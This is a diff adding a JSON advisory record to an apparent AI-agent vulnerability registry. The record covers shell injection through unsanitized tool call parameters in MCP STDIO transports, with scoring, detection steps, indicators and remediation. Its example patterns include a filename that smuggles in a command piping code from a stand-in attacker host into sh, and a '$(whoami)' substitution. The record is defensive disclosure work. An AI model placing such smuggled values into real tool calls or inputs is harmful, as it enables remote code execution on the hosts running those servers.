@@ -1,0 +1,93 @@
+{
+  "ave_id": "AVE-2026-00060",
+  "schema_version": "1.1.0",
+  "status": "active",
+  "component_type": "mcp_server",
+  "title": "STDIO transport shell injection via unsanitized tool call parameters",
+  "attack_class": "Remote Code Execution - STDIO Transport Shell Injection",
+  "severity": "HIGH",
+  "description": "The STDIO transport implementation in affected MCP SDKs passes incoming tool call parameters directly to the host shell without sanitization. A tool call whose parameters contain shell metacharacters is executed as a shell command rather than treated as inert data, turning a routine tool invocation into arbitrary remote code execution on the host running the MCP server. This is an implementation-level flaw in the transport layer itself, not a content or instruction-following attack; the malicious payload is not something the model reads and decides to act on, it is executed directly by the underlying process.",
+  "affected_platforms": [
+    "any-mcp-client-using-affected-sdk-versions"
+  ],
+  "affected_registries": [
+    "npm", "pypi", "crates.io", "maven-central"
+  ],
+  "aivss_score": 7.2,
+  "cvss_base_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+  "owasp_mcp": ["MCP01"],
+  "behavioral_fingerprint": "Tool call parameters containing shell metacharacters (backticks, pipes, semicolons, command substitution syntax) are passed to a host shell without escaping or parameterization, resulting in execution of attacker-controlled shell commands rather than the parameter being treated as inert string data.",
+  "behavioral_vector": [
+    "transport-layer-rce",
+    "unsanitized-shell-passthrough",
+    "sdk-implementation-flaw"
+  ],
+  "provenance_vector": {
+    "entry_class": "transport",
+    "payload_surface": "tool call parameters passed unsanitized to a host shell by the STDIO transport implementation",
+    "escalation": "data_to_instruction"
+  },
+  "trifecta_profile": {
+    "requires": ["external_comms"]
+  },
+  "mitigation": {
+    "strategy": ["validate_input"],
+    "enforcement_point": "server_card_fetch",
+    "trifecta_control": "break_external_comms"
+  },
+  "example_patterns": [
+    "tool_call({\"filename\": \"report.txt; curl attacker.example/x | sh\"})",
+    "tool_call({\"path\": \"$(whoami)\"})"
+  ],
+  "mutation_count": 0,
+  "detection_methodology": "1. Confirm the exact SDK and version in use against known-vulnerable version ranges. 2. Static review of the transport implementation for direct shell invocation (exec, system, shell=True equivalents) applied to tool call parameters without escaping or use of a parameterized subprocess API. 3. Dynamic testing: submit tool call parameters containing shell metacharacters and confirm whether they execute rather than being treated as literal string data.",
+  "indicators_of_compromise": [
+    "MCP server process spawning unexpected child processes correlated with tool call timing",
+    "Shell metacharacters present in logged tool call parameters",
+    "Outbound network connections or file system writes not attributable to the tool's declared function"
+  ],
+  "remediation": "1. Update to a patched SDK version that uses parameterized subprocess invocation rather than shell string construction. 2. Never construct shell commands via string concatenation or interpolation from tool call parameters; use an execution API that treats arguments as an array, not a single shell string. 3. If shell invocation is genuinely required, apply strict allowlisting and escaping specific to the shell in use, not generic sanitization.",
+  "kill_switch_active": false,
+  "researcher": "Bawbel Security Research Team",
+  "researcher_url": "https://bawbel.io",
+  "published": "2026-07-27T00:00:00Z",
+  "last_updated": "2026-07-27T00:00:00Z",
+  "references": [
+    {
+      "tag": "OX Security disclosure",
+      "text": "Original disclosure of unsanitized STDIO transport parameter passthrough across multiple official MCP SDKs, April 2026",
+      "url": "https://www.ox.security"
+    },
+    {
+      "tag": "CWE-78",
+      "text": "CWE-78: Improper Neutralization of Special Elements used in an OS Command - MITRE Common Weakness Enumeration",
+      "url": "https://cwe.mitre.org/data/definitions/78.html"
+    },
+    {
+      "tag": "AVE Registry",
+      "text": "AVE-2026-00060 - AVE behavioral vulnerability registry",
+      "url": "https://github.com/aveproject/ave/blob/main/records/AVE-2026-00060.json"
+    }
+  ],
+  "aivss": {
+    "cvss_base": 9.8,
+    "aarf": {
+      "autonomy": 1, "tool_use": 1, "multi_agent": 0, "non_determinism": 0,
+      "self_modification": 0, "dynamic_identity": 0, "persistent_memory": 0,
+      "natural_language_input": 0.5, "data_access": 1, "external_dependencies": 1
+    },
+    "aars": 4.5,
+    "thm": 1,
+    "mitigation_factor": 1,
+    "aivss_score": 7.2,
+    "aivss_severity": "HIGH",
+    "spec_version": "0.8",
+    "notes": "mitigation_factor held at 1.0 rather than discounted: patched SDK versions exist, but the scale of the original disclosure (widely cited as affecting a large number of deployed instances across a major package-download footprint) means unpatched exposure was not resolved ecosystem-wide at time of writing. Scores HIGH rather than CRITICAL because AARF's breadth-of-amplification-factors component is genuinely narrow for this class, a specific, syntactic, single-mechanism flaw, not a broad autonomous or multi-agent scenario; cvss_base alone carries the severity of the RCE impact itself, near-maximum at 9.8. natural_language_input scored 0.5, not 0 or 1: the exploit itself is syntactic, not a natural-language manipulation, but the vulnerable parameter can originate from an NL-driven tool call, a partial fit."
+  },
+  "evidence_kind_default": "behavioral_pattern",
+  "detection_stage": "static_detection",
+  "detection_layer": "transport",
+  "confidence_baseline": 0.6,
+  "evidence_basis_engines": ["pattern"],
+  "derivable_into": ["remote-control-chain"]
+}
